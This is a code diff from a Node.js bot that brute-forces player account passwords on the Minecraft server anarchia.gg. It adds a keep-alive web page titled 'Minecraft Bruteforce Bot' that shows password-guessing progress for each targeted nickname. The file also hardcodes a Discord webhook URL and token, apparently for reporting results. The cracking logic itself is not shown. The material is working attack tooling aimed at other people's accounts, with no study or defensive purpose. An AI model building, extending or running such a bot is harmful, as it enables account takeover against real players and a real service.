@@ -7,6 +7,55 @@ const server = { host: 'anarchia.gg', port: 25565 };
 const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1457118913962709012/DnLe-AkG_W9GOp7wR2kJoS36JvL3HHDdIBf-ogrZfN3B6yOxi7-IZYFPanx_qFgJVJZP';
 const PROGRESS_FILE = 'progress.json';
 
+// ============ KEEP-ALIVE SERVER ============
+const KEEP_ALIVE_PORT = 3000;
+let statsData = {
+    uptime: 0,
+    accounts: {},
+    lastUpdate: new Date().toISOString()
+};
+
+const keepAliveServer = http.createServer((req, res) => {
+    statsData.uptime = Math.floor(process.uptime());
+    statsData.lastUpdate = new Date().toISOString();
+    
+    res.writeHead(200, { 
+        'Content-Type': 'text/html; charset=utf-8',
+        'Access-Control-Allow-Origin': '*'
+    });
+    
+    const progress = loadProgress();
+    const accountsList = Object.entries(progress)
+        .map(([nick, data]) => `<li><strong>${nick}</strong>: ${data.lastIndex}/${data.totalPasswords}</li>`)
+        .join('');
+    
+    res.end(`
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <meta charset="utf-8">
+            <meta http-equiv="refresh" content="30">
+            <title>Bot Status</title>
+        </head>
+        <body style="font-family: monospace; padding: 20px; background: #0d1117; color: #58a6ff;">
+            <h1>🤖 Minecraft Bruteforce Bot</h1>
+            <p>✅ Status: <span style="color: #3fb950;">RUNNING</span></p>
+            <p>⏱️ Uptime: ${statsData.uptime}s</p>
+            <p>📊 Accounts: ${Object.keys(progress).length}</p>
+            <p>🕐 Last update: ${statsData.lastUpdate}</p>
+            <hr>
+            <h3>📋 Progress:</h3>
+            <ul>${accountsList || '<li>No accounts yet</li>'}</ul>
+            <small style="color: #8b949e;">Auto-refresh every 30s</small>
+        </body>
+        </html>
+    `);
+});
+
+keepAliveServer.listen(KEEP_ALIVE_PORT, () => {
+    console.log(`🌐 Keep-alive server on port ${KEEP_ALIVE_PORT}`);
+});
+
 // ← DODAJ HTTP SERVER (Fly.io tego wymaga)
 const HTTP_PORT = process.env.PORT || 8080;
 const httpServer = http.createServer((req, res) => {
@@ -555,3 +604,4 @@ main().catch(err => {
     process.exit(1);
 
 });
+
